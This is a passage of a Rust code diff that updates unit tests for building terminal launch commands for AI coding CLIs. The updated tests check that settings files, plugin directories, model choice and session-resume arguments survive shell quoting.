+            terminal_mode_command("claude:opus", "", false, &LaunchExtras::settings_only(Path::new("/tmp/fc/hooks.json")));
         assert!(!command.contains("--resume"), "nothing to resume: {command}");
         assert!(command.contains("--model opus"), "the model survives: {command}");
         assert!(command.contains("--settings"), "and so does the live view: {command}");
@@ -6715,7 +6887,7 @@ mod hook_file_tests {
                 "codex",
                 "018f5b2c-0000-7000-8000-00000000000c",
                 resumable,
-                Some(Path::new("/tmp/fc/hooks.json")),
+                &LaunchExtras::settings_only(Path::new("/tmp/fc/hooks.json")),
             );
             assert!(!command.contains("--settings"), "resumable={resumable}: {command}");
         }
@@ -6730,7 +6902,7 @@ mod hook_file_tests {
     fn the_resumed_settings_path_survives_both_shells_too() {
         let path = "/tmp/My Runner/hooks.json";
         let sid = "018f5b2c-0000-7000-8000-00000000000d";
-        let command = terminal_mode_command("claude", sid, true, Some(Path::new(path)));
+        let command = terminal_mode_command("claude", sid, true, &LaunchExtras::settings_only(Path::new(path)));
         let prefix = format!("{} -ilc", farcooler_core::shell::login_shell());
         let probe = command.replace(&prefix, "/bin/sh -c").replace("claude", "printf ,%s");
         assert!(probe.starts_with("/bin/sh -c"), "the prefix was found and replaced: {probe}");
@@ -6745,6 +6917,22 @@ mod hook_file_tests {
             stdout,
             format!(",--resume,{sid},--settings,{path}"),
             "four arguments, and the path is one of them: {probe} -> {stdout}"
+        );
+    }
+
+    /// Resumed as well as fresh: a respawned pane is most claude panes by the
+    /// end of a day, and a manager that loses its skill on a restart has lost
+    /// its rules mid-job.
+    #[cfg(unix)]
+    #[test]
+    fn a_resumed_claude_keeps_the_plugin_dir() {
+        let (s, p) = ("/tmp/My Runner/hooks.json", "/tmp/My Runner/claude-plugin");
+        let sid = "018f5b2c-0000-7000-8000-00000000000f";
+        let extras = LaunchExtras { settings: Some(s.into()), plugin_dir: Some(p.into()) };
+        let command = terminal_mode_command("claude", sid, true, &extras);
+        assert_eq!(
+            super::preset_tests::claude_argv_through_both_shells(&command),
+            format!(",--resume,{sid},--settings,{s},--plugin-dir,{p}")
         );
     }
 
